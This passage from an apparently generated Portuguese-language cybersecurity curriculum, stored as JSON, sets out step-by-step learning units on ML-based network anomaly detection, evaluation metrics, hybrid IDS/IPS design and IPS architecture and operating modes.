                                    "Código custom para fluxos (pcap ou csv parsed)"
                                  ],
                                  "tips": "Visualize features com histograms para validar distribuições.",
                                  "learningObjective": "Dominar engenharia de features para detecção de anomalias em rede.",
                                  "commonMistakes": [
                                    "Calcular entropy em dados vazios (divisão por zero)",
                                    "Sobrecarregar com features irrelevantes (feature selection posterior)",
                                    "Ignorar escala entre features"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Treinamento do Modelo de ML",
                                  "subSteps": [
                                    "Escolher modelo: RandomForest ou IsolationForest para detecção não-supervisionada/supervisionada.",
                                    "Treinar com GridSearchCV para hiperparâmetros (n_estimators, max_depth).",
                                    "Aplicar balanceamento com SMOTE se necessário para classes minoritárias.",
                                    "Salvar modelo treinado com joblib.dump.",
                                    "Plotar feature importance para interpretação."
                                  ],
                                  "verification": "Modelo treinado com score > 0.9 em validação cruzada (cross_val_score).",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "scikit-learn, imbalanced-learn",
                                    "Jupyter para tuning"
                                  ],
                                  "tips": "Comece com baseline simples (LogisticRegression) antes de ensembles.",
                                  "learningObjective": "Implementar e otimizar modelos ML para classificação de tráfego malicioso.",
                                  "commonMistakes": [
                                    "Overfitting sem CV",
                                    "Não usar stratified split para classes",
                                    "Ignorar custo computacional de tuning"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validação e Avaliação do Pipeline",
                                  "subSteps": [
                                    "Testar em conjunto de teste: calcular métricas (precision, recall, F1, ROC-AUC).",
                                    "Simular ataques conhecidos (DDoS, portscan) e verificar detecções.",
                                    "Analisar matriz de confusão e curvas PR para imbalanced data.",
                                    "Otimizar threshold de decisão baseado em FPR alvo (<1%).",
                                    "Gerar relatório com métricas em tabela."
                                  ],
                                  "verification": "F1-score > 0.92 e FPR < 0.01 no teste (classification_report).",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "matplotlib, seaborn para plots",
                                    "scikit-learn metrics"
                                  ],
                                  "tips": "Priorize recall para ataques de alta criticidade.",
                                  "learningObjective": "Avaliar robustez do pipeline com métricas adequadas a cibersegurança.",
                                  "commonMistakes": [
                                    "Focar só em accuracy (enganoso em imbalanced)",
                                    "Não testar em dados unseen",
                                    "Threshold default 0.5 inadequado"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Implementação de Inferência em Tempo Real",
                                  "subSteps": [
                                    "Criar função de inferência: capturar pacotes com Scapy ou nfstream.",
                                    "Processar fluxo em batch/window (ex: 1min sliding window).",
                                    "Carregar modelo e pipeline de features, prever em stream.",
                                    "Integrar alerta: log ou enviar para Kafka/Splunk se anomalia.",
                                    "Testar em loop com tráfego simulado (tcpreplay)."
                                  ],
                                  "verification": "Inferência < 100ms por fluxo, detecção correta em simulação (logs).",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Scapy, nfstream para streaming",
                                    "Flask/FastAPI para API endpoint",
                                    "Docker para deploy"
                                  ],
                                  "tips": "Use threading para baixa latência em produção.",
                                  "learningObjective": "Deployar pipeline ML para monitoramento contínuo de rede.",
                                  "commonMistakes": [
                                    "Latência alta por features pesadas",
                                    "Não bufferizar fluxos incompletos",
                                    "Falta de idempotência em streams"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando dataset CIC-IDS2017, extraia features como entropia de IPs (alta em scans), duração média de fluxos (curta em DDoS), treine IsolationForest, valide com F1=0.94 e deploye em stream com nfstream para detectar brute-force em SSH em tempo real.",
                              "finalVerifications": [
                                "Pipeline completo processa 1000 fluxos/seg sem crash.",
                                "Detecção de ataques simulados com recall >95%.",
                                "Latência end-to-end <500ms.",
                                "Modelo serializado carrega corretamente.",
                                "Relatório de métricas gerado com plots.",
                                "Integração com alerta mock (print/email)."
                              ],
                              "assessmentCriteria": [
                                "Qualidade das features: >80% das top features relevantes para rede.",
                                "Métricas de performance: AUC-ROC >0.95.",
                                "Eficiência: tempo de inferência <1s/fluxo.",
                                "Robustez: funciona em dados novos sem retrain.",
                                "Documentação: código comentado e README.",
                                "Escalabilidade: testado com 10k amostras."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Python e Data Science",
                                "Redes de Computadores e Protocolos (TCP/IP)",
                                "Estatística e Análise de Dados",
                                "Engenharia de Software (pipelines modulares)",
                                "Big Data e Streaming (Kafka, Spark)"
                              ],
                              "realWorldApplication": "Implementação em Intrusion Detection Systems (IDS) empresariais como Suricata ML plugins, firewalls NGFW (Palo Alto), ou SOCs para detecção proativa de APTs, DDoS e malware C2 em redes corporativas."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.3",
                            "name": "Analisar métricas de desempenho em detecção ML",
                            "description": "Explicar uso de precisão, recall, F1-score e curvas ROC para avaliar modelos de detecção de ataques em cenários de tráfego desbalanceado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos de Precisão, Recall e F1-Score",
                                  "subSteps": [
                                    "Defina matriz de confusão: True Positives (TP), False Positives (FP), True Negatives (TN), False Negatives (FN).",
                                    "Calcule Precisão = TP / (TP + FP); explique como mede falsos positivos em detecção de ataques.",
                                    "Calcule Recall = TP / (TP + FN); discuta importância em cenários onde ataques raros não podem ser perdidos.",
                                    "Calcule F1-Score = 2 * (Precisão * Recall) / (Precisão + Recall); interprete como média harmônica.",
                                    "Compare F1 com precisão e recall isolados usando exemplos numéricos simples."
                                  ],
                                  "verification": "Crie uma matriz de confusão manual para um dataset fictício de 100 amostras (90 normais, 10 ataques) e calcule as três métricas corretamente.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Notebook Jupyter",
                                    "Biblioteca scikit-learn",
                                    "Dataset pequeno de tráfego de rede (ex: KDD Cup subset)"
                                  ],
                                  "tips": "Use diagramas visuais para matriz de confusão para fixar conceitos.",
                                  "learningObjective": "Dominar cálculos e interpretações básicas de precisão, recall e F1-score.",
                                  "commonMistakes": [
                                    "Confundir precisão com recall",
                                    "Ignorar normalização na F1",
                                    "Usar média aritmética em vez de harmônica"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Impacto do Desbalanceamento em Métricas",
                                  "subSteps": [
                                    "Identifique desbalanceamento em datasets de detecção de ataques (ex: 99% tráfego normal vs 1% ataques).",
                                    "Simule cenários desbalanceados alterando pesos em um dataset e recalcule métricas.",
                                    "Explique por que precisão alta pode mascarar baixo recall em classes minoritárias.",
                                    "Aplique técnicas como oversampling (SMOTE) ou undersampling e compare métricas antes/depois.",
                                    "Discuta trade-offs: priorizar recall para minimizar falsos negativos em cibersegurança."
                                  ],
                                  "verification": "Gere relatório comparando métricas em dataset original vs balanceado, mostrando melhora no F1 para classe de ataques.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Python com imbalanced-learn",
                                    "Dataset NSL-KDD",
                                    "Gráficos matplotlib para visualização"
                                  ],
                                  "tips": "Sempre plote histogramas de distribuição de classes para visualizar desbalanceamento.",
                                  "learningObjective": "Compreender e mitigar efeitos do desbalanceamento nas métricas de detecção ML.",
                                  "commonMistakes": [
                                    "Achar que acurácia é suficiente",
                                    "Não testar múltiplos níveis de desbalanceamento",
                                    "Ignorar custo de falsos negativos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Curvas ROC e AUC",
                                  "subSteps": [
                                    "Defina Taxa de Verdadeiros Positivos (TPR = Recall) e Taxa de Falsos Positivos (FPR = 1 - Especificidade).",
                                    "Gere curva ROC plotando TPR vs FPR para diferentes thresholds.",
                                    "Calcule Área sob a Curva (AUC): interprete valores (0.5=aleatório, 1=perfeito).",
                                    "Compare ROC de múltiplos modelos em tráfego desbalanceado.",
                                    "Avalie robustez da ROC em cenários desbalanceados vs PR-curvas como alternativa."
                                  ],
                                  "verification": "Plote curvas ROC para dois modelos em dataset desbalanceado e calcule AUC > 0.8 para o melhor.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Scikit-learn metrics.plot_roc_curve",
                                    "Dataset CIC-IDS2017 subset",
                                    "Jupyter notebook"
                                  ],
                                  "tips": "Use thresholds variáveis (0.1 a 0.9) para gerar pontos suaves na curva.",
                                  "learningObjective": "Mestre o uso de ROC/AUC para avaliação independente de threshold em detecção.",
                                  "commonMistakes": [
                                    "Confundir ROC com precisão-recall curve",
                                    "Interpretar AUC isolado sem contexto de desbalanceamento",
                                    "Usar threshold fixo de 0.5"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar e Interpretar Métricas em Cenário Real de Detecção",
                                  "subSteps": [
                                    "Carregue dataset real de ataques de rede (ex: NSL-KDD) e treine modelo simples (Random Forest).",
                                    "Calcule todas métricas (precisão, recall, F1, ROC/AUC) para ataques vs normal.",
                                    "Interprete resultados: identifique se modelo falha em recall devido a desbalanceamento.",
                                    "Ajuste hiperparâmetros ou balanceamento e reavalie melhorias.",
                                    "Gere relatório final com tabelas e gráficos recomendando modelo baseado em métricas."
                                  ],
                                  "verification": "Produza dashboard com métricas finais e conclusões acionáveis para um stakeholder de cibersegurança.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Scikit-learn full pipeline",
                                    "Pandas para manipulação",
                                    "Seaborn para plots avançados",
                                    "Dataset NSL-KDD completo"
                                  ],
                                  "tips": "Salve métricas em DataFrame para fácil comparação entre runs.",
                                  "learningObjective": "Integrar todas métricas em pipeline de avaliação para detecção de ataques.",
                                  "commonMistakes": [
                                    "Treinar sem validação cruzada",
                                    "Não reportar intervalos de confiança nas métricas",
                                    "Ignorar feature engineering inicial"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando dataset NSL-KDD: Treine Random Forest para detectar 'DoS' attacks (1% das amostras). Sem balanceamento: Precisão=0.95, Recall=0.60, F1=0.74, AUC=0.92. Após SMOTE: Recall=0.88, F1=0.91. ROC mostra threshold ótimo em 0.3 para priorizar recall.",
                              "finalVerifications": [
                                "Calcular manualmente precisão/recall/F1 de matriz de confusão com >95% acurácia.",
                                "Plotar e interpretar ROC/AUC para dataset desbalanceado.",
                                "Explicar verbalmente trade-offs em tráfego de rede real.",
                                "Aplicar balanceamento e demonstrar melhora no F1 para classe minoritária.",
                                "Gerar relatório com gráficos profissionais.",
                                "Comparar dois modelos usando múltiplas métricas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e cálculo de métricas básicas (30%)",
                                "Compreensão de desbalanceamento e mitigações (25%)",
                                "Interpretação correta de ROC/AUC (20%)",
                                "Aplicação prática em dataset real com código limpo (15%)",
                                "Relatório claro com insights acionáveis (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Probabilidade condicional e distribuições desbalanceadas",
                                "Programação: Python/scikit-learn para ML pipelines",
                                "Matemática: Cálculo de áreas sob curvas e otimização",
                                "Cibersegurança: Contexto de IDS/IPS em redes",
                                "Análise de Dados: Visualização e manipulação com Pandas/Seaborn"
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), analise métricas de um modelo ML de NIDS para ajustar thresholds, reduzindo falsos negativos em ataques raros como zero-days, melhorando resposta a incidentes em tempo real."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.4",
                            "name": "Discutir integração com IDS/IPS híbridos",
                            "description": "Explorar combinação de ML com assinaturas e anomalias para sistemas híbridos, melhorando cobertura contra ameaças conhecidas e desconhecidas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Fundamentos de IDS/IPS Baseados em Assinaturas e Anomalias",
                                  "subSteps": [
                                    "Defina IDS/IPS e diferencie detecção baseada em assinaturas (regras para ameaças conhecidas) de detecção baseada em anomalias (perfis de tráfego normal).",
                                    "Liste limitações: assinaturas falham em zero-days; anomalias geram falsos positivos.",
                                    "Analise exemplos de ferramentas: Snort para assinaturas, Zeek para anomalias.",
                                    "Crie um diagrama simples comparando os dois métodos.",
                                    "Discuta métricas como taxa de detecção e falsos positivos."
                                  ],
                                  "verification": "Crie um diagrama comparativo e explique verbalmente as limitações de cada método.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Snort/Zeek, papel/diagrama digital (Draw.io), vídeos introdutórios (YouTube/Khan Academy).",
                                  "tips": "Use analogias: assinaturas como chaves de casa (conhecidas), anomalias como detectar intrusos por comportamento estranho.",
                                  "learningObjective": "Compreender as bases e limitações dos métodos tradicionais para contextualizar híbridos.",
                                  "commonMistakes": "Confundir IDS (detecção) com IPS (prevenção); ignorar falsos positivos em anomalias."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Introduzir Detecção Baseada em Aprendizado de Máquina (ML) em IDS/IPS",
                                  "subSteps": [
                                    "Explique algoritmos ML comuns: árvores de decisão, redes neurais, clustering para detecção de anomalias.",
                                    "Descreva treinamento: dados rotulados para supervisionado, não-supervisionado para desconhecidas.",
                                    "Compare ML com anomalias tradicionais: ML adapta dinamicamente vs. thresholds fixos.",
                                    "Liste ferramentas: Suricata com ML plugins, TensorFlow para modelos customizados.",
                                    "Simule um dataset simples de tráfego de rede para treinamento ML."
                                  ],
                                  "verification": "Desenvolva um fluxograma de como ML processa pacotes de rede e detecta ameaças.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Tutoriais Scikit-learn/TensorFlow, datasets KDD Cup 99, Jupyter Notebook.",
                                  "tips": "Comece com ML supervisionado para ameaças conhecidas antes de não-supervisionado.",
                                  "learningObjective": "Identificar como ML melhora detecção de ameaças desconhecidas.",
                                  "commonMistakes": "Assumir ML é infalível (overfitting); ignorar necessidade de dados limpos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Arquitetura de Sistemas IDS/IPS Híbridos",
                                  "subSteps": [
                                    "Descreva integração: camada de assinaturas primeiro, ML para anomalias/zero-days.",
                                    "Detalhe fluxos: pacotes passam por regras -> ML para classificação fina.",
                                    "Discuta feedback loops: ML aprende de alertas de assinaturas.",
                                    "Crie um diagrama de arquitetura híbrida com componentes interconectados.",
                                    "Analise ferramentas reais: Cisco Secure Network Analytics, Palo Alto ML-powered IPS."
                                  ],
                                  "verification": "Construa e apresente um diagrama de arquitetura híbrida funcional.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramentas de diagrama (Lucidchart), whitepapers Cisco/Palo Alto, Wireshark para captura de pacotes.",
                                  "tips": "Pense em camadas: pré-filtro (assinaturas rápidas), pós-filtro (ML pesado).",
                                  "learningObjective": "Mapear como ML, assinaturas e anomalias se integram em um pipeline unificado.",
                                  "commonMistakes": "Ignorar latência: ML pode ser lento; não balancear cargas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Benefícios, Desafios e Melhoria na Cobertura de Ameaças",
                                  "subSteps": [
                                    "Liste benefícios: cobertura ampla (conhecidas + desconhecidas), redução de falsos positivos via ML.",
                                    "Discuta desafios: complexidade de gerenciamento, necessidade de expertise ML.",
                                    "Compare métricas: híbrido vs. puros (ex: 95% detecção vs. 80%).",
                                    "Simule cenários: APT conhecido (assinatura), zero-day (ML).",
                                    "Proponha estratégias de mitigação para desafios (treinamento contínuo)."
                                  ],
                                  "verification": "Escreva um relatório curto (1 página) resumindo prós/contras com exemplos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Artigos NIST sobre IDS híbridos, calculadora de métricas (Excel), cenários de caso (MITRE ATT&CK).",
                                  "tips": "Use dados quantitativos: cite estudos mostrando 20-30% melhoria em detecção.",
                                  "learningObjective": "Avaliar impacto da integração híbrida na segurança de redes.",
                                  "commonMistakes": "Superestimar benefícios sem dados; negligenciar custos operacionais."
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa de um banco, integre Snort (assinaturas para malware conhecido) com um modelo ML TensorFlow treinado em tráfego normal. Quando um ransomware zero-day injeta tráfego anômalo, assinaturas falham, mas ML detecta desvio comportamental (alta entropia em payloads), bloqueando via IPS e alertando SOC.",
                              "finalVerifications": [
                                "Explicar verbalmente como ML complementa assinaturas em zero-days.",
                                "Desenhar arquitetura híbrida correta em 2 minutos.",
                                "Identificar 3 limitações de sistemas não-híbridos.",
                                "Calcular taxa de detecção hipotética para cenário híbrido.",
                                "Discutir um exemplo real de ferramenta híbrida (ex: Suricata + ML).",
                                "Propor melhoria para reduzir falsos positivos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de componentes (assinaturas, anomalias, ML): 25%.",
                                "Clareza no diagrama de arquitetura híbrida: 20%.",
                                "Análise equilibrada de benefícios/desafios: 20%.",
                                "Uso de exemplos concretos e métricas: 15%.",
                                "Conexão com cobertura de ameaças conhecidas/desconhecidas: 10%.",
                                "Originalidade na discussão de integrações: 10%."
                              ],
                              "crossCurricularConnections": [
                                "Machine Learning: Treinamento de modelos para detecção de anomalias.",
                                "Redes de Computadores: Análise de protocolos e tráfego (TCP/IP).",
                                "Estatística: Métricas de precisão/recall em detecção.",
                                "Gestão de Projetos: Implementação e manutenção de sistemas híbridos."
                              ],
                              "realWorldApplication": "Empresas como Google e bancos usam IDS/IPS híbridos (ex: Chronicle com ML) para proteger contra APTs e ransomware, reduzindo tempo de resposta de dias para minutos e cobrindo 98% das ameaças em ambientes de alta escala."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.3.4",
                    "name": "Sistemas de Prevenção de Intrusão (IPS)",
                    "description": "Funcionamento de sistemas IPS para monitoramento em tempo real e bloqueio ativo de intrusões em redes.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.4.1",
                        "name": "Arquitetura e Posicionamento de Sistemas IPS",
                        "description": "Componentes principais e formas de implantação de um IPS na rede para monitoramento eficaz.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.4.1.1",
                            "name": "Identificar componentes principais de um IPS",
                            "description": "Reconhecer e descrever os elementos chave como sensores, motores de detecção, banco de assinaturas e console de gerenciamento em um sistema IPS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a arquitetura geral de um IPS",
                                  "subSteps": [
                                    "Pesquise a definição de IPS e sua diferença de IDS.",
                                    "Identifique os componentes principais listados: sensores, motores de detecção, banco de assinaturas e console de gerenciamento.",
                                    "Estude um diagrama básico de arquitetura IPS.",
                                    "Anote as funções gerais de cada componente em um mapa mental.",
                                    "Compare com exemplos de IPS reais como Snort ou Suricata."
                                  ],
                                  "verification": "Crie um diagrama simples rotulando os 4 componentes principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Snort/Suricata",
                                    "Diagramas de arquitetura IPS online",
                                    "Papel e caneta para mapa mental"
                                  ],
                                  "tips": "Comece pelo todo antes das partes para contextualizar.",
                                  "learningObjective": "Compreender o papel coletivo dos componentes em um IPS.",
                                  "commonMistakes": "Confundir IPS com firewall; focar apenas em detecção sem prevenção."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar os sensores em um IPS",
                                  "subSteps": [
                                    "Defina sensores como pontos de coleta de tráfego de rede.",
                                    "Descreva tipos: inline (bloqueiam tráfego) vs. passive (monitoram apenas).",
                                    "Liste funções: captura de pacotes, análise em tempo real.",
                                    "Examine como sensores se comunicam com outros componentes.",
                                    "Identifique posicionamento típico na rede (ex: atrás de firewall)."
                                  ],
                                  "verification": "Explique em 2-3 frases como um sensor inline previne intrusões.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Vídeos tutoriais sobre sensores IPS (YouTube/Khan Academy)",
                                    "Diagramas de rede com sensores"
                                  ],
                                  "tips": "Visualize o sensor como 'olhos e ouvidos' da rede.",
                                  "learningObjective": "Reconhecer o papel dos sensores na coleta e ação inicial.",
                                  "commonMistakes": "Achar que sensores só monitoram, ignorando modo inline."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar motores de detecção e banco de assinaturas",
                                  "subSteps": [
                                    "Defina motor de detecção como o 'cérebro' que processa dados dos sensores.",
                                    "Descreva métodos: signature-based, anomaly-based, stateful protocol analysis.",
                                    "Explique banco de assinaturas como base de dados de padrões conhecidos de ataques.",
                                    "Discuta atualizações do banco e falsos positivos/negativos.",
                                    "Simule um fluxo: sensor envia pacote → motor verifica assinatura."
                                  ],
                                  "verification": "Liste 3 tipos de detecção e dê um exemplo de assinatura.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Guia de assinaturas Snort",
                                    "Exemplos de regras de detecção"
                                  ],
                                  "tips": "Pense no banco como um 'dicionário de ameaças' atualizável.",
                                  "learningObjective": "Descrever como detecção e assinaturas identificam ameaças.",
                                  "commonMistakes": "Confundir assinaturas com machine learning; ignorar detecção comportamental."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estudar o console de gerenciamento e integração",
                                  "subSteps": [
                                    "Defina console como interface central para configuração e monitoramento.",
                                    "Liste funções: alertas, relatórios, políticas de resposta.",
                                    "Descreva integração com SIEM ou outros sistemas.",
                                    "Explore dashboards típicos e logs de eventos.",
                                    "Simule configuração básica de um console."
                                  ],
                                  "verification": "Desenhe um fluxograma da interação entre todos os componentes via console.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Screenshots de consoles IPS (ex: Cisco Secure IPS)",
                                    "Tutoriais de gerenciamento"
                                  ],
                                  "tips": "Veja o console como o 'painel de controle' do administrador.",
                                  "learningObjective": "Identificar o console como hub de gerenciamento.",
                                  "commonMistakes": "Subestimar o console como apenas 'visualizador'; ignorar automação."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar e praticar identificação de componentes",
                                  "subSteps": [
                                    "Revise todos os componentes em um diagrama completo.",
                                    "Identifique componentes em cenários reais ou simulações.",
                                    "Crie uma tabela comparativa de funções e interações.",
                                    "Teste com quiz: dado um componente, descreva sua função.",
                                    "Discuta limitações e evoluções modernas (ex: IPS na nuvem)."
                                  ],
                                  "verification": "Responda corretamente a 5 perguntas sobre identificação em um diagrama.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Diagramas IPS completos",
                                    "Quiz online sobre IPS"
                                  ],
                                  "tips": "Use flashcards para memorizar funções chave.",
                                  "learningObjective": "Aplicar conhecimento para identificar componentes holisticamente.",
                                  "commonMistakes": "Memorizar isoladamente sem entender interdependências."
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa, um sensor inline captura tráfego suspeito de um exploit SQL injection; o motor de detecção compara com o banco de assinaturas, identifica match e bloqueia via sensor; o console de gerenciamento gera alerta e relatório para o analista revisar políticas.",
                              "finalVerifications": [
                                "Liste e descreva corretamente os 4 componentes principais.",
                                "Explique o fluxo de dados entre sensores, motor e console.",
                                "Identifique componentes em um diagrama fornecido.",
                                "Diferencie funções de cada componente sem confusões.",
                                "Discuta um exemplo real de uso integrado.",
                                "Responda quiz com 90% de acerto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de cada componente (25% cada, total 100%).",
                                "Compreensão de interações (20%).",
                                "Uso correto de terminologia técnica (15%).",
                                "Exemplos práticos fornecidos (15%).",
                                "Identificação visual em diagramas (15%).",
                                "Ausência de erros comuns como confusão com IDS (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Posicionamento de sensores em topologias.",
                                "Programação: Análise de regras de assinaturas como scripts.",
                                "Análise de Dados: Processamento de logs no console.",
                                "Gestão de Projetos: Configuração e manutenção de IPS."
                              ],
                              "realWorldApplication": "Em uma empresa, administradores usam IPS para bloquear ransomware em tempo real: sensores monitoram tráfego, motores detectam via assinaturas, console alerta equipes de TI para resposta rápida, prevenindo breaches financeiras."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.2",
                            "name": "Diferenciar modos de operação de IPS",
                            "description": "Explicar as diferenças entre modos inline (bloqueio ativo) e passivo (monitoramento), incluindo vantagens e desvantagens de cada um.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais de IPS e modos de operação",
                                  "subSteps": [
                                    "Pesquise a definição de Intrusion Prevention System (IPS) e sua função principal em redes.",
                                    "Identifique os dois modos principais: inline e passivo.",
                                    "Leia documentação oficial sobre como o IPS se posiciona na rede para cada modo.",
                                    "Anote as diferenças iniciais entre bloqueio ativo e monitoramento.",
                                    "Visualize diagramas de fluxo de tráfego para cada modo."
                                  ],
                                  "verification": "Crie um diagrama simples comparando o fluxo de tráfego nos dois modos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação oficial de IPS (ex: Snort ou Suricata)",
                                    "Diagramas de rede online"
                                  ],
                                  "tips": "Use ferramentas como Draw.io para diagramas rápidos.",
                                  "learningObjective": "Entender o papel do IPS e distinguir conceitualmente os modos inline e passivo.",
                                  "commonMistakes": [
                                    "Confundir IPS com IDS sem considerar prevenção ativa.",
                                    "Ignorar o impacto no tráfego de rede."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o modo inline (bloqueio ativo)",
                                  "subSteps": [
                                    "Descreva como o IPS inline inspeciona e bloqueia pacotes em tempo real.",
                                    "Liste vantagens: prevenção imediata de ameaças, proteção proativa.",
                                    "Identifique desvantagens: possível latência na rede, risco de falsos positivos bloqueando tráfego legítimo.",
                                    "Simule em ferramenta virtual o posicionamento inline entre roteador e servidor.",
                                    "Registre exemplos de regras de bloqueio."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito como um pacote malicioso é bloqueado no modo inline.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta virtual como GNS3 ou EVE-NG",
                                    "Guia de configuração Snort inline"
                                  ],
                                  "tips": "Teste com tráfego simulado para observar bloqueios.",
                                  "learningObjective": "Dominar as características, vantagens e desvantagens do modo inline.",
                                  "commonMistakes": [
                                    "Subestimar o impacto de falsos positivos em produção.",
                                    "Confundir com modo bridge transparente."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o modo passivo (monitoramento)",
                                  "subSteps": [
                                    "Explique como o IPS passivo copia tráfego via SPAN/mirror port sem interferir.",
                                    "Liste vantagens: zero impacto na performance da rede, ideal para análise.",
                                    "Identifique desvantagens: apenas alerta, sem bloqueio automático.",
                                    "Compare com sniffer como Wireshark em configuração passiva.",
                                    "Anote cenários onde o modo passivo é preferível."
                                  ],
                                  "verification": "Descreva um cenário onde o modo passivo é usado e liste alertas gerados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Wireshark para captura de pacotes",
                                    "Documentação de portas SPAN em switches"
                                  ],
                                  "tips": "Configure uma porta mirror em um switch virtual para prática.",
                                  "learningObjective": "Compreender as características, vantagens e desvantagens do modo passivo.",
                                  "commonMistakes": [
                                    "Achar que passivo bloqueia tráfego (é só monitoramento).",
                                    "Ignorar limitações de visibilidade em redes segmentadas."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar modos e decidir posicionamento",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: inline vs passivo (vantagens/desvantagens, uso).",
                                    "Discuta cenários híbridos (ex: inline em borda, passivo interno).",
                                    "Avalie trade-offs: segurança vs performance.",
                                    "Pesquise casos reais de falhas por escolha errada de modo.",
                                    "Formule critérios para escolher o modo em uma rede."
                                  ],
                                  "verification": "Preencha uma tabela comparativa e justifique escolhas para 3 cenários de rede.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha Excel/Google Sheets",
                                    "Estudos de caso de IPS em blogs de segurança"
                                  ],
                                  "tips": "Priorize cenários de alta criticidade para inline.",
                                  "learningObjective": "Saber diferenciar e selecionar o modo adequado com base em contexto.",
                                  "commonMistakes": [
                                    "Escolher inline sem plano de fallback para falsos positivos.",
                                    "Usar passivo em segmentos de alta risco."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório com Snort no modo inline, configure regras para bloquear ataques SQL injection em tráfego HTTP simulado entre um cliente e servidor web; alterne para modo passivo e observe apenas alertas sem bloqueio, medindo latência com ping.",
                              "finalVerifications": [
                                "Liste 3 vantagens e 2 desvantagens de cada modo.",
                                "Desenhe diagramas de rede para inline e passivo.",
                                "Explique por que inline causa latência e passivo não.",
                                "Identifique cenário ideal para cada modo.",
                                "Compare IPS inline com firewall de próxima geração.",
                                "Simule uma escolha errada e suas consequências."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e diferenças entre modos (80% correto).",
                                "Compreensão de vantagens/desvantagens com exemplos (completa).",
                                "Capacidade de diagramar fluxos de tráfego.",
                                "Justificativa contextual para escolha de modo.",
                                "Identificação de riscos e mitigações.",
                                "Uso correto de terminologia técnica."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Posicionamento e fluxo de tráfego (SPAN ports).",
                                "Análise de Malware: Detecção em modo passivo para forense.",
                                "Gestão de Riscos: Trade-offs segurança vs performance.",
                                "Administração de Sistemas: Configuração de appliances IPS.",
                                "Ética em TI: Impacto de falsos positivos em usuários."
                              ],
                              "realWorldApplication": "Em data centers empresariais, IPS inline protege servidores críticos contra exploits zero-day em tempo real, enquanto modo passivo em SOCs permite análise forense sem interromper operações, otimizando conformidade com normas como PCI-DSS."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.4.1.3",
                            "name": "Planejar posicionamento de IPS na rede",
                            "description": "Analisar pontos estratégicos de implantação, como entre firewall e servidores, considerando tráfego de rede e cobertura de segmentos.",
